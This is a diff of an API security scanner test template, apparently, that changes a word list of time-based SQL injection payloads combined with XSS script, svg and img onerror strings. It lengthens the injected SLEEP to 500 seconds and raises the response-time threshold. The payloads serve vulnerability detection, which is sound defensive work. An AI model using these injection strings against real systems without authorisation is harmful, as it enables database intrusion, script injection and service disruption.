@@ -76,12 +76,12 @@ api_selection_filters:
         extract: userVal
 wordLists:
   timeBasedPayloads:
-    - "' AND IF(1=1, SLEEP(5), 0) UNION SELECT null,'<script>alert(\"XSS\");</script>' --"
-    - "' OR IF(1=1, SLEEP(5), 0) UNION SELECT null,concat('<svg/onload=alert(\"XSS\")>') --"
-    - "' AND IF(1=1, SLEEP(5), 0) UNION SELECT null,'<img src=\"x\" onerror=\"alert('XSS')\"> --"
-    - "' OR IF(1=1, SLEEP(5), 0) UNION SELECT null,concat('<script>alert(\"XSS\");</script>') --"
-    - "' AND IF(1=1, SLEEP(5), 0) UNION SELECT null,'<svg/onload=alert(\"XSS\")>' --"
-    - "' OR IF(1=1, SLEEP(5), 0) UNION SELECT null,concat('<img src=\"x\" onerror=\"alert('XSS')\">') --"
+    - "' AND IF(1=1, SLEEP(500), 0) UNION SELECT null,'<script>alert(\"XSS\");</script>' --"
+    - "' OR IF(1=1, SLEEP(500), 0) UNION SELECT null,concat('<svg/onload=alert(\"XSS\")>') --"
+    - "' AND IF(1=1, SLEEP(500), 0) UNION SELECT null,'<img src=\"x\" onerror=\"alert('XSS')\"> --"
+    - "' OR IF(1=1, SLEEP(500), 0) UNION SELECT null,concat('<script>alert(\"XSS\");</script>') --"
+    - "' AND IF(1=1, SLEEP(500), 0) UNION SELECT null,'<svg/onload=alert(\"XSS\")>' --"
+    - "' OR IF(1=1, SLEEP(500), 0) UNION SELECT null,concat('<img src=\"x\" onerror=\"alert('XSS')\">') --"
 execute:
   type: multiple
   requests:
@@ -139,7 +139,7 @@ validate:
   and:
     - compare_greater:
         - ${x2.response.stats.median_response_time}
-        - 5001
+        - 15001
     - compare_greater:
         - ${x2.response.stats.median_response_time}
         - ${x1.response.stats.median_response_time} * 5
